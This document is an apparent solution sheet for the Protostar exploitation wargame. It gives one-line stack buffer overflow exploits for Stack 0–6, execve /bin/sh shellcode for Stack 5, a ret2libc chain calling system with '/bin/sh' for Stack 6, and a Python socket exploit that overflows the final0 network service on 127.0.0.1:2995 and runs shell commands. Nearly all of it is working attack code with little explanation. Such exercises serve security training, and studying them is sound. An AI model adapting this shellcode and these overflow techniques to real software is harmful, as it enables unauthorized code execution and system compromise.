Protostar
===========
## Stack 0
(python -c "print '0'*65") | ./stack0

## Stack 1
./stack1 $(python -c "print 'a'*64 + 'dcba'")

## Stack 2
export GREENIE=$(python -c "print 'a'*64 + '\x0a\x0d\x0a\x0d'") ; ./stack2

## Stack 3
objdump -x stack3 | grep win   |||||||   (python -c "print 'a'*64 + '\x24\x84\x04\x08'";) | ./stack3

## Stack 4
objdump -x stack4 | grep win  
(python -c "print 'a'*76 + '\xf4\x83\x04\x08'";) | ./stack4

## Stack 5
- python -c "print 'a'*70 + 'B'*4 +'C'*4 +'D'*4 + 'E'*4" > padding
- gdb -q stack5 
- break * main 
- disassemble main 
- run < padding 
- info registers
- random stack address = \xcc\xf7\xff\xbf
- (python -c "print 'a' * 76 + '\xcc\xf7\xff\xbf' + '\x90' * 40 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat) | ./stack5

## Stack 6
gdb -q stack6 ||||| break * getpath |||| run < padding |||| info registers ||||| p system $1 |||| info proc mappings $2 |||| $ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh" $3 |||| 0xb7e97000 + 0x11f3bf = 0xb7fb63bf |||| (python -c "print  'a'*80 + '\xb0\xff\xec\xb7' + '\x90'*4 + '\xbf\x63\xfb\xb7'"; cat) | ./stack6

## Final 0
gdb -p `pidof final0` ||||  set follow-fork-mode child |||| run |||| python -c "print 'a'*522+ 'aaaabbbbccccdd'" | nc 127.0.0.1 2995 |||| info registers |||| info proc mappings |||| strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"

```
import struct
import socket

HOST = '127.0.0.1'
PORT = 2995

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

padding = 'a' * 532

execve = struct.pack('I', 0x08048c0c)

binsh = struct.pack('I', 0xb7e97000 + 0x11f3bf) #mappings + strings
exploit = padding + execve + '\x90' * 4 + binsh + '\x00' * 8
client.send(exploit + '\n')
client.send('id\n')
print(client.recv(1024))
client.send('whoami\n')
print(client.recv(1024))
```